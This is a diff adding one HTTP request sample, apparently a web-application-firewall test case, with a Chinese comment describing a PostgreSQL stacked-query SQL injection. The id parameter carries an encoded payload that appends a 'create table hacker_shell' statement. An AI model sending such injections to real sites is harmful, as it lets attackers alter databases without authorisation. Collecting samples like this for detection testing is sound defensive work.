@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506347
+# 攻击者基于堆叠查询，将"create table hacker_shell(shell text not null)"语句注入到 SQL 查询参数中，目的是使用create语句创建任意表结构。
+GET /?id=1%3Bcreate%20table%20hacker_shell%28shell%20text%20not%20null%29&bid=hd_tag_m8mv23yy HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23yy
+RM-PRO-Token: 705147f5d24bcc3d553b3ee5eff118a8
+RM-PRO-Time: 1742808353595
+User-Agent: curl/7.83.1
+
